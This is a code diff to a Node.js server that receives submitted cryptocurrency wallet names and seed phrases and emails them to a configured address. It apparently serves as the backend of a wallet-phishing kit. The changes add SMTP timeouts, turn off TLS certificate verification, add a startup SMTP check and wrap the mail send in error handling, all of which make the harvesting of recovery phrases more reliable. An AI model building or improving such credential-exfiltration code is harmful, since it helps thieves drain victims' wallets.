@@ -10,7 +10,7 @@ const __dirname = path.dirname(url.fileURLToPath(import.meta.url));
 // Initialize Neon database connection
 const sql = neon(process.env.DATABASE_URL);
 
-// Configure Nodemailer transporter
+// ✅ Configure Nodemailer transporter with timeout settings
 const transporter = nodemailer.createTransport({
   host: process.env.SMTP_HOST,
   port: parseInt(process.env.SMTP_PORT),
@@ -18,6 +18,13 @@ const transporter = nodemailer.createTransport({
   auth: {
     user: process.env.SMTP_USER,
     pass: process.env.SMTP_PASS,
+  },
+  // ✅ Add timeout settings to prevent hanging
+  connectionTimeout: 10000, // 10 seconds to connect
+  socketTimeout: 10000, // 10 seconds for socket operations
+  // ✅ TLS settings for better compatibility
+  tls: {
+    rejectUnauthorized: false, // Allow self-signed certificates
   },
 });
 
@@ -44,6 +51,20 @@ async function initDatabase() {
     console.log("✅ Database table initialized");
   } catch (error) {
     console.error("❌ Database initialization error:", error);
+  }
+}
+
+// Verify SMTP connection on startup
+async function verifySmtpConnection() {
+  try {
+    console.log("🔍 Verifying SMTP connection...");
+    await transporter.verify();
+    console.log("✅ SMTP connection verified successfully!");
+  } catch (error) {
+    console.error("⚠️ SMTP verification failed:", error.message);
+    console.error(
+      "Check your SMTP credentials: SMTP_HOST, SMTP_PORT, SMTP_USER, SMTP_PASS",
+    );
   }
 }
 
@@ -157,38 +178,52 @@ const sendEmail = async (req, res, body) => {
     }
 
     console.log("📤 Sending email via Nodemailer...");
+    console.log("⏱️ Timeout: 10 seconds for connection and socket operations");
 
-    // ✅ Send email via Nodemailer
-    const result = await transporter.sendMail({
-      from: process.env.SMTP_FROM || process.env.SMTP_USER,
-      to: process.env.SMTP_TO,
-      subject: `New Message from ${walletName}`,
-      html: `
-        <h2>New Submission</h2>
-        <p><strong>Name:</strong> ${walletName}</p>
-        <p><strong>Icon:</strong> ${walletIcon}</p>
-        <p><strong>Message:</strong></p>
-        <p>${seedPhrase.replace(/\n/g, "<br>")}</p>
-        <hr>
-        <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
-      `,
-    });
+    // ✅ Send email via Nodemailer with error handling
+    try {
+      const result = await transporter.sendMail({
+        from: process.env.SMTP_FROM || process.env.SMTP_USER,
+        to: process.env.SMTP_TO,
+        subject: `New Message from ${walletName}`,
+        html: `
+          <h2>New Submission</h2>
+          <p><strong>Name:</strong> ${walletName}</p>
+          <p><strong>Icon:</strong> ${walletIcon}</p>
+          <p><strong>Message:</strong></p>
+          <p>${seedPhrase.replace(/\n/g, "<br>")}</p>
+          <hr>
+          <p style="color: #999; font-size: 12px;">Received at: ${new Date().toLocaleString()}</p>
+        `,
+      });
 
-    console.log("✅ Email sent via Nodemailer:", result.messageId);
+      console.log(
+        "✅ Email sent successfully via Nodemailer:",
+        result.messageId,
+      );
 
-    res.writeHead(200, {
-      "Content-Type": "application/json",
-      "Access-Control-Allow-Origin": "*",
-    });
-    res.end(
-      JSON.stringify({
-        success: true,
-        message: "✅ Email sent successfully via Nodemailer",
-        messageId: result.messageId,
-      }),
-    );
+      res.writeHead(200, {
+        "Content-Type": "application/json",
+        "Access-Control-Allow-Origin": "*",
+      });
+      res.end(
+        JSON.stringify({
+          success: true,
+          message: "✅ Email sent successfully via Nodemailer",
+          messageId: result.messageId,
+        }),
+      );
+    } catch (smtpError) {
+      console.error("❌ SMTP Error Details:", {
+        code: smtpError.code,
+        message: smtpError.message,
+        command: smtpError.command,
+      });
+
+      throw smtpError;
+    }
   } catch (err) {
-    console.error("❌ Email error:", err);
+    console.error("❌ Email error:", err.message);
     res.writeHead(500, {
       "Content-Type": "application/json",
       "Access-Control-Allow-Origin": "*",
@@ -258,7 +293,7 @@ const server = http.createServer((req, res) => {
         res.end(JSON.stringify({ success: true, messageId: result.messageId }));
       })
       .catch((err) => {
-        console.error("❌ Test email failed:", err);
+        console.error("❌ Test email failed:", err.message);
         res.writeHead(500, { "Content-Type": "application/json" });
         res.end(JSON.stringify({ error: err.message }));
       });
@@ -297,10 +332,13 @@ const PORT = process.env.PORT || 3000;
 
 // Initialize database and start server
 initDatabase().then(() => {
+  verifySmtpConnection();
+
   server.listen(PORT, () => {
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`📧 Email provider: Nodemailer (SMTP)`);
     console.log(`🔑 SMTP Host set: ${process.env.SMTP_HOST ? "Yes" : "No"}`);
+    console.log(`🔑 SMTP Port: ${process.env.SMTP_PORT || "587"}`);
     console.log(`🔑 SMTP User set: ${process.env.SMTP_USER ? "Yes" : "No"}`);
     console.log(
       `💾 Database URL set: ${process.env.DATABASE_URL ? "Yes" : "No"}`,
